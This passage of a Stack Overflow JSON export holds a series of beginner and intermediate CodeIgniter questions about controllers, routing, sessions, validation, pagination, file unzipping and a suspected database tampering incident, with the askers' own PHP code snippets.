=&gt; 0\n    );\n    for ($i = 0; $i &lt;= $this-&gt;input-&gt;post('max_i'); $i++) {\n        if ($this-&gt;input-&gt;post('kodebr' . $i)) {\n            $detail_pbt = array(\n                'kode_pbt' =&gt; $this-&gt;input-&gt;post('kode_pbt'),\n                'kodebr' =&gt; $this-&gt;input-&gt;post('kodebr' . $i),\n                'harga' =&gt; $this-&gt;input-&gt;post('beli' . $i),\n                'jml' =&gt; $this-&gt;input-&gt;post('jml' . $i),\n                'subtotal_harga' =&gt; $this-&gt;input-&gt;post('subtotal' . $i)\n            );\n            array_push($pbt_detail, $detail_pbt);\n        }\n    }\n\n\n    $this-&gt;db-&gt;trans_begin();\n    $this-&gt;Pbt_model-&gt;insert_pbt($pbt_data);\n    $this-&gt;Pbt_model-&gt;insert_detail_pbt($pbt_detail);\n    if ($this-&gt;db-&gt;trans_status() == FALSE) {\n        $this-&gt;db-&gt;trans_rollback();\n\n        echo \"TRANSACTION ROLLBACK\";\n    } else {\n        $pbt_data['detail'] = $pbt_detail;\n        $url = SERVER_SIKOPIT . 'service/service?process=pbt&amp;api_key=' . API_KEY;\n        $response = json_encode($this-&gt;rest_helper($url, $pbt_data, \"POST\"));\n        echo $response;\n        $response = json_decode($response);\n        if ($response-&gt;status == true) {\n            $this-&gt;db-&gt;trans_commit();\n            echo \"TRANSACTION SUCCESS\";\n            redirect(site_url('receivings'));\n        } else {\n            $this-&gt;db-&gt;trans_rollback();\n            echo \"INSERT PBT BARU GAGAL !!\";\n            echo \"TRANSACTION ROLLBACK\";\n        }\n    }\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":197,"score":1,"question_id":9686858,"title":"CodeIgniter basic controller extends","body":"<p>I want to extend basic controller by my own. This is code of file <code>MY_Secure.php</code> which i put in <code>application/libraries</code> </p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nClass MY_Secure extends CI_Controller {\n  public function __construct() {\n    parent::__construct();\n    if(!$this-&gt;session-&gt;userdata('status') == 'admin') {\n        $data['message'] = '&lt;p class=\"error\"&gt;You shold login in admin area&lt;/p&gt;';\n        $this-&gt;load-&gt;view('admin/login', $data);\n    }\n  }\n}\n?&gt;\n</code></pre>\n\n<p>And here is my controller in <code>application/controllers/category.php</code></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Category extends MY_Secure {\n\nfunction __construct()\n{\n    parent::__construct();\n}\n\n public function index()\n{\n $data['login'] = $this-&gt;session-&gt;userdata('login');\n $data['status'] = $this-&gt;session-&gt;userdata('status');\n\n $this-&gt;load-&gt;model('categories_model');\n $data['main_categories'] = $this-&gt;categories_model-&gt;get_main_categories();\n\n $this-&gt;load-&gt;view('admin/headers/main', $data);\n $this-&gt;load-&gt;view('admin/category');\n $this-&gt;load-&gt;view('admin/footer/main');\n}\n?&gt;\n</code></pre>\n\n<p>But i have an error <code>Fatal error: Class 'MY_Secure' not found in Z:\\home\\ci.local\\www\\application\\controllers\\admin\\category.php on line 3</code> How can i avoid this error? What i do wrong?</p>\n"},{"tags":["ajax","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12995536,"title":"Codeigniter+AJAX+JQUERY validation required","body":"<p>I am trying to implement ajax,jquery with codeigniter form validation, but i am stuck in ajax and jquery. I have tried all possibilities but no solution, i have also tried below url:\n<a href=\"http://stackoverflow.com/questions/10243501/get-validation-errors-through-jquery-ajax-and-codeigniter\">get validation errors through jquery ajax and codeigniter</a></p>\n\n<p>This is working if i use same code but when i implement on my code its not working\ncan any one give me simple example so same i can use for my script.</p>\n\n<p>when i submit form i get following string:</p>\n\n<pre><code>{\"name\":\"The Name field is required.&lt;\\/p&gt;\",\"password\":\"The Your Password field is required.&lt;\\/p&gt;\"}\n</code></pre>\n"},{"tags":["php","codeigniter","redirect","http-status-code-302"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":43,"score":3,"question_id":12994093,"title":"Why does identical redirect function give me different behaviour","body":"<p>If I ignore the 302, I see that <code>redirect()</code> stops output, but <code>header()</code> doesn't. <code>redirect()</code> uses <code>header()</code> to set the 302 response. Different behaviour, same function. What gives?</p>\n\n<p>Some context: I'm building a site with CodeIgniter, and I'm playing with how the site should deal with guests and members.</p>\n\n<p>Extending the CI Core:</p>\n\n<pre><code>class MY_Controller extends CI_Controller {\n    if (! $authenticated) redirect('/login');\n}\n</code></pre>\n\n<p>Now a controller:</p>\n\n<pre><code>class Members_only extends MY_Controller {\n    function index()\n    {\n    // Display members only content\n    }\n}\n</code></pre>\n\n<p>Then I thought, what if Alice (an unauthenticated visitor) ignores the 302 response? Can she see the rest of the content after the redirect? So I tested it, and now I'm totally confused. There's two functions that are available to me to send a 302 redirect.</p>\n\n<pre><code>header('Location: http://mywebsite.com/login', TRUE, 302);\n</code></pre>\n\n<p>And from CI's URL helper:</p>\n\n<pre><code>redirect('/login');\n</code></pre>\n\n<p>Here is what it looks like from the inside:</p>\n\n<pre><code>function redirect($uri = '', $method = 'location', $http_response_code = 302)\n{\n    if ( ! preg_match('#^https?://#i', $uri))\n    {\n        $uri = site_url($uri);\n    }\n\n    switch($method)\n    {\n        case 'refresh' : header(\"Refresh:0;url=\".$uri);\n                         break;\n        default        : header(\"Location: \".$uri, TRUE, $http_response_code);\n                         break;\n    }\n    exit;\n}\n</code></pre>\n\n<p><code>site_url()</code> is returning \"http://mywebsite.com/login\".</p>\n\n<p>Can someone point out what I'm missing here?</p>\n"},{"tags":["codeigniter","codeigniter-2","codeigniter-url","codeigniter-routing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":12993673,"title":"Codeigniter parameters","body":"<p>I've read the URI parameters user guide and still have a question:</p>\n\n<p><a href=\"http://codeigniter.com/user_guide/general/routing.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/general/routing.html</a></p>\n\n<p>With the following:\n{http://myapp/locations/1}  I get a 404 error...\n{http://myapp/locations}   appropriately executes the index() function in the Main controller\n{http://myapp/locations/main/locations/1} works, and the value is passed properly to index($var)</p>\n\n<p>I do have other functions in Main.</p>\n\n<p>How is it possible to get the first line to work in order to clean URL's?</p>\n\n<p>Thanks in advance,\nAlan </p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":754,"score":0,"question_id":4353435,"title":"codeigniter download problem","body":"<p>when using download helper in Ci, I get file download pop up as page load , how do i stop that ?</p>\n"},{"tags":["codeigniter","kendo-ui"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12992506,"title":"Kendo UI + Codeigniter","body":"<p>I'm trying to create some CRUD grids using Kendo UI + Codeigniter and i would like to ask if </p>\n\n<p>anyone knows how to handle the Kendo scripts in the views. Is it better to use a common view </p>\n\n<p>for all grids and pass each time the Kendo script as a paramater to the view or is it better </p>\n\n<p>to use a separate view for each grid and hardcode the Kendo script in the view. </p>\n\n<p>Or is there any better way?</p>\n"},{"tags":["php","file","codeigniter","zip"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12989669,"title":"Codeigniter Zip Library how to zip existent file","body":"<p>Im moving un-zipped files to a server directory  /zip/file.unzipped.png</p>\n\n<p>now i need to take that file and zip it.</p>\n\n<p>Is it possible to do that or a need the zip archive as codeigniter guide says?</p>\n\n<p>How can i do that?</p>\n"},{"tags":["php","codeigniter","codeigniter-2","codeigniter-url"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12991550,"title":"Avoiding _model suffixes in CodeIgniter","body":"<p>If you're like me, you think CodeIgniter is pretty nice. You also probably hate typing _model every time you load or call a method or property from your models, because it's ugly and time-consuming.</p>\n\n<p>I've been searching for a solution to this for a couple hours with no luck - so I put together a quick fix.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":111,"score":1,"question_id":8290237,"title":"codeigniter template assistance","body":"<p>Hello all im new to codeigniter and new to the hole template system.\nså i hope some one will help me out and maybe look at my code and see if i can do something better so i can learn something new :).</p>\n\n<p>i have try to install this template system\nwilliamsconcepts.com/ci/codeigniter/libraries/template/index.html</p>\n\n<p>but i just cant get it to work, so i found this template system \nmaestric.com/doc/php/codeigniter_template</p>\n\n<p>but i dont know how to add a sidebar and footer function to it.</p>\n\n<p>and i have try for 3 days now and just dont know what to do :/.\nYou can not see my project any longer here <a href=\"https://github.com/SimonJ/Hip-hop-project\" rel=\"nofollow\">https://github.com/SimonJ/Hip-hop-project</a></p>\n\n<p>Best Regards Sjmon</p>\n"},{"tags":["php","class","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":3557,"score":1,"question_id":1680721,"title":"How to load helper from model in CodeIgniter?","body":"<p>I want to load some helper in a model. How to do this? Tried to use:</p>\n\n<pre><code>${get_parent_class($this)}-&gt;load-&gt;helper ('text');\n</code></pre>\n\n<p>But still getting an error</p>\n\n<blockquote>\n  <p>Fatal error: Call to a member function helper() on a non-object</p>\n</blockquote>\n"},{"tags":["php","codeigniter","drop-down-menu"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":181,"score":0,"question_id":8227875,"title":"How do I create an array for a range of values with keys using php?","body":"<p>I am using CodeIgniter. I want to create an array to add to a dropdown which contains the numbers 1 -> 1000. </p>\n\n<p>I have tried the php <code>range()</code> function like so</p>\n\n<pre><code>$arr = range(1,1000);\n</code></pre>\n\n<p>It worked and create a dropdown from 1 to 1000.</p>\n\n<hr>\n\n<p>I do have one problem though. </p>\n\n<p>When select text <code>1</code> from my drop down and post, the posting value is <code>0</code>.\nBecause by default the keys are starting from <code>0</code> and the key is set to the dropdown value</p>\n\n<p>Here is part of my drop down HTML</p>\n\n<pre><code>&lt;select id=\"user-day\" class=\"dropdown-small Verdana11-424039\" tabindex=\"123456\" name=\"days_of_month\"&gt;\n&lt;option value=\"0\"&gt;1&lt;/option&gt;\n&lt;option value=\"1\"&gt;2&lt;/option&gt;\n&lt;option value=\"2\"&gt;3&lt;/option&gt;\n&lt;option value=\"3\"&gt;4&lt;/option&gt;\n&lt;option value=\"4\"&gt;5&lt;/option&gt;\n&lt;option value=\"5\"&gt;6&lt;/option&gt;\n&lt;option value=\"6\"&gt;7&lt;/option&gt;\n</code></pre>\n\n<p>Is there any way I can define <code>range()</code> with key values?</p>\n\n<p>Such that the values will become</p>\n\n<pre><code>&lt;option value=\"1\"&gt;1&lt;/option&gt;\n&lt;option value=\"2\"&gt;2&lt;/option&gt;\n&lt;option value=\"3\"&gt;3&lt;/option&gt;\n</code></pre>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":12984663,"title":"I can't get the session of user facebook, getUser return 0 - codeigniter","body":"<p>Regards,</p>\n\n<p>I have a problem with Facebook SDK-PHP and Codeigniter.</p>\n\n<p>I do not get the user's session when I try to capture and obtain basic data for that user.</p>\n\n<p>The error I get is: \"An active access token must be used to query information about the current user.\"</p>\n\n<p>And when I apply the \"getUser ()\", I get \"0\".</p>\n\n<p>NOTE: I download the php-sdk and put on my directory libraries the files base_facebook.php and facebook.php</p>\n\n<p>In my application/config/config.php I put the key and app_secret of my facebook application.</p>\n\n<p>Config.php :</p>\n\n<pre><code>$config['base_url'] = 'http://localhost/myapp_local';\n$config['app_id'] = 'xxxxxxxxxxxxxx';\n$config['secret'] = 'xxxxxxxxxxxxxxxxxxxxxxxx';\n$config['app_name'] = 'http://apps.facebook.com/myapp_local/';\n</code></pre>\n\n<p>In my Controller Main.php i have the follow code:</p>\n\n<pre><code>class Main extends CI_Controller {\n\n    public function __construct() {\n        parent::__construct();\n        $fb_config = array(\n            'appId' =&gt; $this-&gt;config-&gt;item('app_id'),\n            'secret' =&gt; $this-&gt;config-&gt;item('secret')\n        );\n        $this-&gt;load-&gt;library('facebook', $fb_config);\n\n    private function _getInfoUserFB() {\n        try {\n            $fb_id = $this-&gt;facebook-&gt;getUser();\n            if ($fb_id) {\n                $fb_data = $this-&gt;facebook-&gt;api('/me');\n                return $fb_data;\n            }\n        } catch (Exception $exc) {\n            echo $exc;\n        }\n    }\n       [....]\n}\n</code></pre>\n\n<p>Now, in my variables $fb_id , where obtain the bool value, always i have \"0\".\nSo, when i try to get the data of the current user facebook always i have a Exception with the message: \"An active access token must be used to query information about the current user.\"</p>\n\n<pre><code>$fb_data['id'] = NULL\n$fb_data['first_name'] = NULL\n$fb_data['last_name'] = NULL\n</code></pre>\n\n<p>What i doing wrong here? Any step or setting I miss?</p>\n\n<p>NOTE 2: I don't have some button Login with Facebook, my app connect directly to facebook via the configuration of my app on facebook. (Canvas URL, Secure Canvas URL, Canvas Page, Site URL)</p>\n\n<p>Note 3: My application have some permission that need require, So I put the necessary permissions on Settings-Permissions BUT don't show me the option of \"Auth Referrals\" to show Dialog confirm permissions.</p>\n\n<p>I use CodeIgniter version 2.1.3 and PHP-SDK v 3.2.0</p>\n"},{"tags":["javascript","eclipse","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12990654,"title":"Eclipse javascript build path has bad reference","body":"<p>I'm using Eclipse-php working with codeigniter and am having a problem:</p>\n\n<pre><code>The project was not validated since the source file /MyProject/js/bootstrap.min.js \ncould not be read.\n</code></pre>\n\n<p>I don't have the minified version of bootstrap in my project, but, instead, I have the normal version.  </p>\n\n<p>I checked the JavaScript include path for both global and project settings in Eclipse, and it's not listed there.  I also cleaned and rebuilt the project several times to no avail.</p>\n\n<p>Can anyone tell me how to get the JavaScript validator to stop looking for this file?</p>\n"},{"tags":["php","codeigniter","session"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":155,"score":0,"question_id":8323189,"title":"Session message after insert data","body":"<p>I use CodeIgniter 2.1.0, i store data session in database <a href=\"http://codeigniter.com/user_guide/libraries/sessions.html\" rel=\"nofollow\"><code>ci_sessions</code></a>,  i want after insert data in database get a message like \"Your information was successfully updated.\" by <code>set_flashdata</code> and <code>flashdata</code> (that these don't work) now my problem is here that after once click (for insert data in database) store data session in database as following image in two row in first row column <code>user_data</code> is empty but in second row it have data, how can fix it?</p>\n\n<p><img src=\"http://i.stack.imgur.com/1qSmb.png\" alt=\"enter image description here\"></p>\n"},{"tags":["codeigniter","hmvc","laravel","bundles"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":273,"score":0,"question_id":12713214,"title":"Laravel vs Codeigniter - Get CI's HMVC functionality in Laravel","body":"<p>If I'm not mistaking, Laravel's Bundles should be similar to Codeigniter's Hierarchical MVC triads. I have a project built in CI and I want to migrate it to Laravel, so I'm trying to match some functionality. In CI all there was to it was to install HMVC extension, create an appropriate folder structure and you can already access your newly created controllers. In Laravel though, after you create a bundle, you need to register it in <code>application/bundles.php</code> by adding</p>\n\n<pre><code>return array('newbundle'),\n</code></pre>\n\n<p>Is there a way for me to automatically register all the (valid) bundles that exist in my bundles directory? As in, without having to explicitly register every new bundle. In other words, I want to make bundles a bit more dynamic, so that I can just copy one bundle, paste it in another project and start using it right away.</p>\n\n<p>As a side-question, does anyone have an idea of the 'proper' way to achieve with Laravel's bundles what Wordpress does with its plugins: show a list of all the bundles installed in the bundles dir, but only activate (register) the selected ones?</p>\n"},{"tags":["php","class","codeigniter","methods"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12988899,"title":"PHP/Codeigniter classes and methods definition","body":"<p>i have a class like this:</p>\n\n<pre><code>class Asd{\n\nfunction index(){\n$this-&gt;doSomenthing();\n\n}\n\nfunction doSomenthing(){\n\n}\n\n}\n</code></pre>\n\n<p>i'm using codeigniter so doSomenthing == <a href=\"http://www.site.com/asd/dosomenthing\" rel=\"nofollow\">http://www.site.com/asd/dosomenthing</a>;</p>\n\n<p>i would like to leave that method as \"private\" it can be used but not accessed by http requests, it should be used only from the other methods inside the class.</p>\n\n<p>Does i need to declare that method as <code>private function doSomenthing(){}</code> ?</p>\n"},{"tags":["php","codeigniter","many-to-many"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12986018,"title":"1 query depends on another query codeigniter","body":"<p>I have a table tbparent_module,tbsub_module and a junction table called tbmodule_pairing wherein it contains the IDs of the 2 tables (tbparent_module,tbsub_module)</p>\n\n<p>On my controller I called a model that will query all the parent module and will display it on the view. I already did this but my problem is, I need to display also its sub module.</p>\n\n<p><em>Example of output</em></p>\n\n<pre><code>Parent Module 1\n     Sub Mod 1\n     Sub Mod 2\n     Sub Mod 3\n\nParent Module 2\n     Sub Mod 1\n     Sub Mod 2\n     Sub Mod 3\n\nParent Module 3\n     Sub Mod 1\n     Sub Mod 2\n     Sub Mod 3\n</code></pre>\n\n<p>This is my code as of now</p>\n\n<p><strong>view</strong></p>\n\n<pre><code>foreach($module as $result){\n      $sql = mysql_query(\"SELECT * FROM `tbsub_module` where parent_id='$result-&gt;id'\");\n      while($row=mysql_fetch_array($sql)){\n         echo $row['subcateg_name'];\n      }\n}\n</code></pre>\n\n<p>I know this is wrong. But this the only way I know to solve my problem. I want to follow the MVC rule and I also I want to use CodeIgniter's library</p>\n"},{"tags":["php","codeigniter","unzip"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":175,"score":0,"question_id":11325310,"title":"how to unzip uploaded zip file?","body":"<p>I am trying to upload a zipped file using codeigniter framework with following code </p>\n\n<pre><code>function do_upload()\n{\n    $name=time();\n    $config['upload_path'] = './uploadedModules/';\n    $config['allowed_types'] = 'zip|rar';\n    $this-&gt;load-&gt;library('upload', $config);\n\n    if ( ! $this-&gt;upload-&gt;do_upload())\n    {\n        $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n        $this-&gt;load-&gt;view('upload_view', $error);\n    }\n    else\n    {\n        $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n        $this-&gt;load-&gt;library('unzip');\n\n    // Optional: Only take out these files, anything else is ignored\n    $this-&gt;unzip-&gt;allow(array('css', 'js', 'png', 'gif', 'jpeg', 'jpg', 'tpl', 'html', 'swf'));\n\n     $this-&gt;unzip-&gt;extract('./uploadedModules/'.$data['upload_data']['file_name'], './application/modules/'); \n\n\n\n        $pieces = explode(\".\", $data['upload_data']['file_name']);\n        $title=$pieces[0];\n        $status=1;\n        $core=0;\n        $this-&gt;addons_model-&gt;insertNewModule($title,$status,$core);\n\n    }\n}\n</code></pre>\n\n<p>But the main problem is that when extract function is called, it extract the zip but the result is empty folder. Is there any way to overcome this problem?</p>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":116,"score":0,"question_id":6059511,"title":"Should I bold the text in View, Controller or Model? (Codeigniter, not not specific to it)","body":"<p>Lets refer to '<a href=\"http://www.yelp.com/search?find_desc=food&amp;ns=1&amp;find_loc=Cambridge,%20MA%2002138#find_loc=new%20york%20city\" rel=\"nofollow\">Sort by</a>' section on Yelp: </p>\n\n<p>I have 3 anchor() functions that generate the 3 links. When one of the 'sort by' option is selected, I want to remove the hyperlink/anchor() and bold it to show that it is selected just like on the page above.</p>\n\n<p>Right now I am thinking of doing a uri_to_assoc() to $arr because the selected option will be in the url like controller/function/sort_by/best_reviews/.., then based on what is the key (best_reviews) or element (sort_by), use the following code in <strong>view</strong></p>\n\n<pre><code>&lt;?php\n$arr = uri_to_assoc(3);\n\nif($arr['sort_by'] == 'best_reviews') {\n    echo \"&lt;strong&gt;Best Reviews&lt;/strong&gt;\";\n} else {\n    anchor('controller/function/sort_by/best_reviews', 'Best Reviews');\n]\n?&gt;\n</code></pre>\n\n<p>Now I believe the MVC idea is to keep little php code (logic code?) in the view. In this case, will you put the above code in the view, or have that logic in controller/model then pass the final code to display (either the echo or the anchor()) in an array and just echo the array in view?\n.</p>\n\n<p>.</p>\n\n<p><strong>Mini Question (PHP)</strong></p>\n\n<p>If $arr['sort_by'] is not defined in the case that /sort_by/variable does not exist in the url, the statement if($arr['sort_by'] == 'best_reviews') will give an error. Will u nest all the above code in a if(isset($arr['sort_by'])){} ?</p>\n"},{"tags":["php","mysql","codeigniter","sql-injection","hacking"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":85,"score":4,"question_id":12986358,"title":"\"Use PDO\" in MySQL Table. Is this a hack?","body":"<p>OK, it may sound ridiculous but this is what happened :</p>\n\n<ul>\n<li>I've set up a site, fully working, on <strong>CodeIgniter</strong></li>\n<li>The site is obviously db-driven, with users tables (and many more) in it</li>\n<li>Today, I've logged in, and in the place of \"Name\"... instead of the username, I'm seeing <code>\"Use PDO\"</code> <em>(I've also checked the db table, from phpMyAdmin, and the specific field seems to have been altered :S)</em>.</li>\n</ul>\n\n<p>And I'm thinking : \"Somebody has hacked the site\". Something like a bad (though educational) joke, maybe?</p>\n\n<p>Am I right? (I feel a bit stupid asking that, but whatever...)</p>\n\n<p>If so, what should I do in order to prevent such a thing happening in the future?</p>\n\n<hr>\n\n<p><strong>Hint :</strong> ALL my db access is done using CodeIgniter's db function, so I suppose everything should have been properly escaped. Any ideas?</p>\n"},{"tags":["php","codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":33,"score":3,"question_id":12986257,"title":"How to construct an active record query in codeigniter?","body":"<p>I have recently begun converting my backend queries in my codeigniter application to active record pattern. As of now I am using codeigniter 2.1 version. I have originally written a query in mysql as </p>\n\n<pre><code>SELECT * FROM table WHERE (field1 = $field1 OR field2 = $field2) AND field3 = $field3 AND field4 = 'text'\n</code></pre>\n\n<p>Now I would like to write this thing in a way given below:</p>\n\n<pre><code>$this-&gt;db-&gt;select('*');\n$this-&gt;db-&gt;from('table');\n$this-&gt;db-&gt;where('field1',$field1);\n$this-&gt;db-&gt;or_where('field2',$field1);\n$this-&gt;db-&gt;where('field3',$field2);\n$this-&gt;db-&gt;where('field4','text');\n</code></pre>\n\n<p>But somehow the \"or_where\" function is not working properly. Any solution for this, would be my pleasure?</p>\n"},{"tags":["validation","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":600,"score":1,"question_id":8487066,"title":"validation max_length, min_length in codeigniter","body":"<p>I am getting an error when trying to set custom validation messages in CodeIgniter for the min_length and max_length validation constraints.</p>\n\n<p>These are my validation rules:</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('username', 'Username', 'required|xss_clean|min_length[6]|max_length[10]');\n$this-&gt;form_validation-&gt;set_rules('password', 'Password', 'required|min_length[8]|max_length[20]';\n</code></pre>\n\n<p>These are my custom validation message:</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_message('min_length[3]', '%s: the minimum of characters is three');\n$this-&gt;form_validation-&gt;set_message('max_length[20]', '%s:the maximum of characters is 20');\n</code></pre>\n\n<p>In my example we have two fields, but I have many fields with different minimum and maximum length values. They all have a specific constraint validations. This messages doesn't work. The message appears by default.  Thanks for your help.</p>\n"},{"tags":["php","codeigniter","hmvc"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":514,"score":5,"question_id":11104630,"title":"How to create a widget system in Codeigniter","body":"<p>I am creating a custom CMS in Codeigniter and I'd like to have a widget system similar to what is used in Wordpress.</p>\n\n<p>For example, I'd like to have a widget that shows the last 5 posts displayed on the sidebar. I'd also like to be able to control what pages this widget appears on page-by-page basis.</p>\n\n<p>I am using <a href=\"http://philsturgeon.co.uk/demos/codeigniter-template/user_guide/\" rel=\"nofollow\">Phil Sturgeon's Template library</a>, so an example controller looks like:</p>\n\n<pre><code>$this-&gt;template-&gt;set_partial('header', 'layouts/header');\n$this-&gt;template-&gt;set_partial('footer', 'layouts/footer');\n$this-&gt;template-&gt;set_partial('sidebar', 'layouts/sidebar');\n\n$this-&gt;data['title'] = \"Create Post\";\n$this-&gt;template-&gt;build('create', $this-&gt;data);\n</code></pre>\n\n<p>I'd like to stick with the MVC pattern, so I don't want to put logic in the sidebar view, which is the only thing I can think of right now. </p>\n\n<p>Is HMVC something I should be using for this?</p>\n\n<p>How can I tell the sidebar which widgets to display?</p>\n"},{"tags":["codeigniter","codeigniter-routing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":12978330,"title":"How to create cleaner urls with codeigniter's routes","body":"<p>Please i want to convert urls that look like this <a href=\"http://site.com/account?username=theUsername\" rel=\"nofollow\">http://site.com/account?username=theUsername</a> to look more like this <a href=\"http://site.com/account/theUsername\" rel=\"nofollow\">http://site.com/account/theUsername</a>. How is this possible, am using codeigniter as my frame work please help ASAP, thanks.</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12981363,"title":"Passing User Id between controllers","body":"<p>Experts,</p>\n\n<p>what's the recommended way to pass the user id (system internal id of the user used to query for the user info) between controllers in a codeigniter app?</p>\n\n<p>I'm considering the following options:\n1. Use the CI session id to query the database for the user id in every controller. That way I don't have to place the user id in the session which is a security concern. But this option means an extra db query in every controller\n2. Store the user id directly in the session so I have it readily available to query for user info. </p>\n\n<p>What do you think?</p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":1408,"score":0,"question_id":4799805,"title":"CodeIgniter session losing data","body":"<p>I'm not sure why, but I am losing my CodeIgniter session data between pages.  And the session ID is changing.  What could cause this?  Shouldn't it be accessible from any page once it is set?</p>\n\n<p>Session data is set here in the configuration page:</p>\n\n<pre><code>&lt;?php $config = array(\n                    'power' =&gt; $_COOKIE['power'],\n                    'oemclass4' =&gt; $_COOKIE['class'],\n                    'cooling' =&gt; $_COOKIE['cooling'],\n                    'beam' =&gt; $_COOKIE['beam'],\n                    'wavelength' =&gt; $_COOKIE['wavelength'],\n                    'model_no' =&gt; $_COOKIE['part']);\n\n    $this-&gt;session-&gt;set_userdata('config', $config);\n\n?&gt;\n</code></pre>\n\n<p>The user is then redirected to a page with details of their configuration.  The session userdata is still there then.  Then they are Javascript redirected (window.location) to the login page and the userdata is gone then.                   </p>\n"},{"tags":[".htaccess","codeigniter","redirect","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12983761,"title":"Codeigniter issue - remove trailing slashes, redirect other non-permitted URI characters to a 404 page","body":"<p>I have recently added the following to .htaccess to remove trailing slashes:  </p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.+)/$ $1 [L,R=301]\n</code></pre>\n\n<p>I also extend CI_URI to remove non-permitted URI chars and redirect to a 404 page (thankyou to whoever was the original author, not me!):</p>\n\n<pre><code>public function _filter_uri($str)\n{\nif ($str != '' &amp;&amp; $this-&gt;config-&gt;item('permitted_uri_chars') != '' &amp;&amp; $this-&gt;config-&gt;item('enable_query_strings') == FALSE)\n{\n// preg_quote() in PHP 5.3 escapes -, so the str_replace() and addition of - to   preg_quote() is to maintain backwards\n// compatibility as many are unaware of how characters in the permitted_uri_chars will be parsed as a regex pattern\nif ( ! preg_match('|^['.str_replace(array('\\\\-', '\\-'), '-', preg_quote($this-&gt;config-&gt;item('permitted_uri_chars'), '-')).']+$|i', $str))\n{\nshow_404(); //show 404 error page instead \"The URI you submitted has disallowed characters\" error\n}\n}\n\n// Convert programatic characters to entities and return\nreturn str_replace(\narray('$',     '(',     ')',     '%28',   '%29'),\n// Bad\narray('&amp;#36;', '&amp;#40;', '&amp;#41;', '&amp;#40;', '&amp;#41;'),\n// Good\n$str);\n}\n}\n</code></pre>\n\n<p>Since I added the .htaccess code, any disallowed characters in the URI e.g. <a href=\"http://www.mysite.com/contro,ller/func,tion\" rel=\"nofollow\">http://www.mysite.com/contro,ller/func,tion</a> (with commas) result in a redirect to a 301 page, with a subsequent link to a 404 error page (i.e. \"The page has moved here\" with a link to my standard 404 page).</p>\n\n<p>Can I get both to work together, so disallowed chars are just redirected to my standard 404 page?</p>\n"},{"tags":["php","codeigniter"],"answer_count":10,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":4667,"score":3,"question_id":5384644,"title":"codeigniter pagination url with get parameters","body":"<p>I am having trouble setting up pagination on codeigniter when I pass parameters in the URL</p>\n\n<p>if my url is like this : <code>search/?type=groups</code></p>\n\n<p>what should be my <code>$config['base_url']</code> for pagination to work?</p>\n\n<p>if i set the base url to <code>search/?type=groups</code> the resulting url is <code>search/?type=groups/10</code></p>\n\n<p>which means <code>$_GET['type']=groups/10</code>  </p>\n\n<p>thank you</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12980918,"title":"Make the variables passed to a view unavailable for sub-views in codeigniter","body":"<p>Controller</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Main extends CI_Controller \n{\n\n    public function index()\n    {\n        $this-&gt;load-&gt;model('Event');\n        $todays_events = $this-&gt;Event-&gt;get_todays_events();     \n\n        $data = array(\n            'todays_events' =&gt; $todays_events\n        );\n        